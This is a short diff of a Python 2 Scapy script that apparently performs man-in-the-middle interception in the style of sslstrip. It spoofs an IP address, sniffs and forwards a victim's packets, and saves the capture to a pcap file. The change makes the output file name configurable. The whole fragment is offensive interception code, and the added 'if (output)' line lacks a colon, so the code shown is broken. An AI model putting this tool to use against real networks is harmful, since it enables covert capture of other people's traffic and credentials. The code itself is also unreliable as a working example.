@@ -8,7 +8,7 @@ def forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa):
         send(ipLayerS / p[TCP], iface = ifa, verbose = False)
     return p.summary()
         
-def startforwarding(ipToSpoof, ifa, timeOut):
+def startforwarding(ipToSpoof, ifa, timeOut, output):
     attackerMac = gethostmac(ifa)
     print "Listening as " + ipToSpoof
 
@@ -34,4 +34,5 @@ def startforwarding(ipToSpoof, ifa, timeOut):
         lfilter = lambda(p): p[Ether].src != attackerMac,
         prn = lambda(p): forward(p, ipToSpoof, ipVictim, ipLayerS, ipLayerC, ifa))
     #save sniffed packets
-    wrpcap('sslstrip.pcap', packets)
+    if (output)
+        wrpcap(output, packets)
